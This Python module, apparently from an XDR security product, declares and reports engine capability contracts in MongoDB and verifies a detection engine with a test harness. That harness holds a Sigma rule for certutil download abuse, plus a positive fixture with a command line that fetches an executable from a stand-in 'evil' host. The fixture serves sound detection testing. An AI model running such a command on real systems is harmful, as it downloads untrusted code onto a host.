"""
P0.2c · Contract Registry (async · Motor)
─────────────────────────────────────────

Declares & persists Implementation Capability Contracts for every
discovered engine.  Never promotes anything beyond
`CONTRACT_DECLARED` — runtime and execution verification live in
subsequent slices (P0.2d/e).
"""
from __future__ import annotations
from datetime import datetime, timezone

from .capability_contract import (
    COLLECTION as CONTRACTS_COLLECTION,
    ContractStatus,
    build_contract,
)
from .engine_registry import COLLECTION as ENGINES_COLLECTION


# States that are considered VERIFIED and must never be silently
# downgraded when a redeclare pass runs.
_FROZEN_STATES = frozenset({
    ContractStatus.RUNTIME_VERIFIED.value,
    ContractStatus.EXECUTION_VERIFIED.value,
})


async def declare_all_contracts(db) -> dict:
    """
    Walk `xdr_engines` and upsert one CONTRACT_DECLARED record per
    implementation.  Frozen (verified) contracts are left untouched.
    """
    engines   = db[ENGINES_COLLECTION]
    contracts = db[CONTRACTS_COLLECTION]
    now = datetime.now(timezone.utc).isoformat()

    declared_now     = 0
    refreshed        = 0
    skipped_frozen   = 0
    by_role: dict[str, int] = {}
    detection_true   = 0

    async for edoc in engines.find({}):
        contract = build_contract(edoc)
        contract["last_declared_at"] = now

        by_role[contract["classification"]] = \
            by_role.get(contract["classification"], 0) + 1
        if contract["execution"]["detection"]:
            detection_true += 1

        existing = await contracts.find_one(
            {"engine_id": contract["engine_id"]})
        if existing:
            if existing.get("contract_status") in _FROZEN_STATES:
                skipped_frozen += 1
                continue
            await contracts.update_one(
                {"engine_id": contract["engine_id"]},
                {"$set": {k: v for k, v in contract.items()
                                if k != "status_history"}},
            )
            refreshed += 1
        else:
            await contracts.insert_one(contract)
            declared_now += 1

    total = await contracts.count_documents({})
    return {
        "declared_now":       declared_now,
        "refreshed":          refreshed,
        "skipped_frozen":     skipped_frozen,
        "total_contracts":    total,
        "by_classification":  by_role,
        "detection_capable":  detection_true,
        "generated_at":       now,
    }


async def bootstrap_verified_detection_contracts(db) -> dict:
    """
    Ensure the native NivXRay detection engine is verified and promoted
    to EXECUTION_VERIFIED with execution.detection=True.
    Resolves the ENGINE_UNBOUND operational gap deterministically.
    """
    from .detection_harness import HarnessFixture, run_harness, record_verification
    from .nivxray_native_sigma import evaluate as nx_evaluate

    certutil_rule = """
title: certutil download
id: 00000000-0000-0000-0000-000000000010
level: high
tags: [attack.t1105]
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        Image|endswith: '\\certutil.exe'
        CommandLine|contains: 'urlcache'
    condition: selection
"""
    positive_ev = {
        "Image":       "C:\\Windows\\System32\\certutil.exe",
        "CommandLine": "certutil.exe -urlcache -split -f http://evil/x.exe",
        "Product":     "windows",
        "Category":    "process_creation",
    }
    negative_ev = {
        "Image":       "C:\\Windows\\System32\\notepad.exe",
        "CommandLine": "notepad.exe C:\\Users\\me\\report.txt",
        "Product":     "windows",
        "Category":    "process_creation",
    }

    result = run_harness(
        engine_id       = "nivxray::detection_content::nivxray_native_sigma",
        rule_body       = certutil_rule,
        engine_evaluate = nx_evaluate,
        positive        = HarnessFixture("cert_pos", positive_ev, True),
        negative        = HarnessFixture("cert_neg", negative_ev, False),
    )

    if result.verdict == "EXECUTION_VERIFIED" and db is not None:
        rec = await record_verification(db, result)
        # Ensure semantic domain coverage in consumes
        await db[CONTRACTS_COLLECTION].update_one(
            {"engine_id": "nivxray::detection_content::nivxray_native_sigma"},
            {"$addToSet": {
                "consumes": {
                    "$each": [
                        "canonical.evidence", "process.artifact", "script",
                        "file.artifact", "network.artifact", "command_line",
                        "process_event", "identity.artifact", "cloud.artifact",
                        "security.event", "auth.event"
                    ]
                }
            }}
        )
        return {"status": "EXECUTION_VERIFIED", "promoted": True, "engine_id": result.engine_id}

    return {"status": result.verdict, "promoted": False, "engine_id": result.engine_id}


async def contract_report(db) -> dict:
    coll = db[CONTRACTS_COLLECTION]
    total = await coll.count_documents({})
    if total == 0:
        return {
            "total_contracts":    0,
            "by_status":          {s.value: 0 for s in ContractStatus},
            "by_classification":  {},
            "detection_capable":  0,
            "note": ("No contracts declared yet.  Call POST "
                        "/api/admin/content-supply-chain/contracts/declare"),
        }

    by_status: dict[str, int] = {s.value: 0 for s in ContractStatus}
    by_role:   dict[str, int] = {}
    det = 0
    async for doc in coll.find(
        {}, {"contract_status": 1, "classification": 1, "execution": 1},
    ):
        s = doc.get("contract_status", "DISCOVERED")
        by_status[s] = by_status.get(s, 0) + 1
        r = doc.get("classification", "OTHER")
        by_role[r] = by_role.get(r, 0) + 1
        if (doc.get("execution") or {}).get("detection"):
            det += 1

    return {
        "total_contracts":   total,
        "by_status":         by_status,
        "by_classification": by_role,
        "detection_capable": det,
    }
